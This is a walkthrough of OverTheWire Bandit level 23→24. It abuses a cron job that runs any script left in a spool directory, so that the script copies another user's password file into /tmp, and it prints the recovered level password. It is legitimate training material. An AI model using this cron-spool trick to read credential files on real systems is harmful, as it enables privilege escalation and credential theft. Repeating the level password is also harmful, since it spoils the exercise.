# BANDIT LEVEL 23 --> LEVEL 24

```
http://overthewire.org/wargames/bandit/bandit24.html
```

### Level Goal

A program is running automatically at regular intervals from cron, the time-based job
scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being
executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step
and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to
keep a copy around…

### Commands you may need to solve this level

```
cron, crontab, crontab(5) (use “man 5 crontab” to access this)
```

### SOLUTION

```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
    echo "Handling $i"
    timeout -s 9 60 ./$i
    rm -f ./$i
    fi
done
bandit23@bandit:~$ ls -l /var/spool/bandit24/
ls: cannot open directory '/var/spool/bandit24/': Permission denied
```

Okay, so we see that there is a cron job that will execute all scripts within
`/var/spool/bandit24` every minute and then delete them. We ultimately want to dump
the contents of `/etc/bandit_pass/bandit24` which we don't have permission to do as
ourselves..

```
bandit23@bandit:~$ mkdir /tmp/mytemp
bandit23@bandit:/tmp/mytemp$ chmod 777 /tmp/mytemp
bandit23@bandit:/tmp/mytemp$ ls -ld /tmp/mytemp
drwxrwxrwx 2 bandit23 root 4096 Oct 24 01:30 /tmp/mytemp
bandit23@bandit:~$ cat /tmp/mytemp/bandit24_passwd.sh
#! /bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/mytemp/bandit_pass.out
bandit23@bandit:~$ chmod +x /tmp/mytemp/bandit24_passwd.sh
bandit23@bandit:~$ cp /tmp/mytemp/bandit24_passwd.sh /var/spool/bandit24/bandit24_passwd.sh
```

And now we wait..

```
bandit23@bandit:/tmp/mytemp$ date
Wed Oct 24 01:33:09 CEST 2018
bandit23@bandit:/tmp/mytemp$ date
Wed Oct 24 01:34:12 CEST 2018
bandit23@bandit:/tmp/mytemp$ cat bandit_pass.out
attempting to read /etc/bandit_pass/bandit24
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
